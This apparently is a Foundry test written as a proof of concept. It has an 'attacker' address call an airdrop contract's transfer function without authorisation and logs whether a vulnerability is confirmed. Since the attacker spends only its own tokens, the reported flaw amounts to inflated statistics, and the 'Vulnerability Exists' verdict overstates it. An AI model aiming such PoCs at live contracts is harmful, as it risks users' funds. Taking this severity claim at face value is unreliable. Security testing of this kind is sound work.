// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol"; // Added for better logging
import "../src/0xa1fceeff3acc57d257b917e30c4df661401d6431.sol";

contract AirDropContract_NoAccessControl_Test is Test {
    AirDropContract airDrop;
    MockToken token;
    
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    address recipient = makeAddr("recipient");

    function setUp() public {
        // Deploy contracts
        vm.prank(deployer);
        airDrop = new AirDropContract();
        token = new MockToken();
        
        // Configure token
        token.mint(attacker, 1000 ether);
        vm.prank(attacker);
        token.approve(address(airDrop), 1000 ether);
    }

    function test_UnauthorizedAirdrop() public {
        address[] memory recipients = new address[](1);
        recipients[0] = recipient;
        
        uint[] memory amounts = new uint[](1);
        amounts[0] = 1000 ether;

        // Record state BEFORE unauthorized transfer
        console2.log("--- BEFORE-Trigger State ---");
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 recipientBalanceBefore = token.balanceOf(recipient);
        uint256 recipientAirdropCountBefore = airDrop.userAirdropCount(recipient);
        uint256 recipientTokensReceivedBefore = airDrop.tokensReceived(recipient);
        uint256 totalAirdropsBefore = airDrop.totalAirdrops();
        uint256 totalTokensDistributedBefore = airDrop.totalTokensDistributed();
        
        console2.log("Attacker token balance before: ", attackerBalanceBefore);
        console2.log("Recipient token balance before: ", recipientBalanceBefore);
        console2.log("Recipient airdrop count before: ", recipientAirdropCountBefore);
        console2.log("Recipient received tokens before: ", recipientTokensReceivedBefore);
        console2.log("Total airdrops before: ", totalAirdropsBefore);
        console2.log("Total tokens distributed before: ", totalTokensDistributedBefore);

        console2.log("\n--- Trigger Action: Unauthorized Transfer ---");
        vm.prank(attacker);
        airDrop.transfer(address(token), recipients, amounts);
        console2.log("Attacker executed unauthorized airdrop\n");

        // Record state AFTER unauthorized transfer
        console2.log("--- AFTER-Trigger State ---");
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        uint256 recipientBalanceAfter = token.balanceOf(recipient);
        uint256 recipientAirdropCountAfter = airDrop.userAirdropCount(recipient);
        uint256 recipientTokensReceivedAfter = airDrop.tokensReceived(recipient);
        uint256 totalAirdropsAfter = airDrop.totalAirdrops();
        uint256 totalTokensDistributedAfter = airDrop.totalTokensDistributed();
        
        console2.log("Attacker token balance after: ", attackerBalanceAfter);
        console2.log("Recipient token balance after: ", recipientBalanceAfter);
        console2.log("Recipient airdrop count after: ", recipientAirdropCountAfter);
        console2.log("Recipient received tokens after: ", recipientTokensReceivedAfter);
        console2.log("Total airdrops after: ", totalAirdropsAfter);
        console2.log("Total tokens distributed after: ", totalTokensDistributedAfter);

        // Calculate state changes
        bool unauthorizedTransferSucceeded = 
            (attackerBalanceBefore == 1000 ether) &&
            (attackerBalanceAfter == 0) &&
            (recipientBalanceAfter - recipientBalanceBefore == 1000 ether);
        
        bool statsUpdatedSuccessfully = 
            (recipientAirdropCountAfter == recipientAirdropCountBefore + 1) &&
            (recipientTokensReceivedAfter == recipientTokensReceivedBefore + 1000 ether) &&
            (totalAirdropsAfter == totalAirdropsBefore + 1) &&
            (totalTokensDistributedAfter == totalTokensDistributedBefore + 1000 ether);
        
        bool vulnerabilityConfirmed = unauthorizedTransferSucceeded && statsUpdatedSuccessfully;

        // Print vulnerability verdict
        console2.log("\n--- Vulnerability Verification ---");
        console2.log("Transfer executed by unauthorized user: ", unauthorizedTransferSucceeded ? "SUCCESS" : "FAILED");
        console2.log("Airdrop statistics updated: ", statsUpdatedSuccessfully ? "YES" : "NO");
        
        // Final verdict determination
        if (vulnerabilityConfirmed) {
            console2.log("Vulnerability Exists: Unauthorized airdrop executed successfully and updated system statistics");
        } else {
            if (!unauthorizedTransferSucceeded) {
                console2.log("Vulnerability not Exist: Token transfer did not complete as expected");
            } else {
                console2.log("Vulnerability not Exist: Airdrop statistics update failed after transfer");
            }
        }
    }
}

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}